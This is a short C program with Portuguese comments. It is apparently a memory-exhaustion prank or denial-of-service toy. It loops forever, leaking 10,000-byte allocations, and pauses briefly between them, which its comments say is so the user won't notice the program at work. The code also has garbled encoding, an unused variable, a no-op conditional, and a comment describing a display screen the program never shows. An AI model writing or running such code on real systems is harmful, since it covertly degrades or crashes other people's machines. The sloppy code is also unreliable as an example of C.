#include <stdlib.h>
#include <stdio.h>

acao(){  // main secundaria, onde a magica acontece
	char *f;    //lota��o de memoria 
	while(1){  
 f = malloc (10000); // lota a memoria com 10000 bytes a cada loop e deixa perdida. Impossivel de achar o endere�o da mesma.
 usleep(10); // espera um tempo para que o usuario n�o perceba a a��o do programa.
}
}
main(){  // main principal, onde mostrar� a tela, enquando o programa � executado na main secundaria.
	int i;
	i = 2;
	if(1==0);
	acao();
	return 0;
}
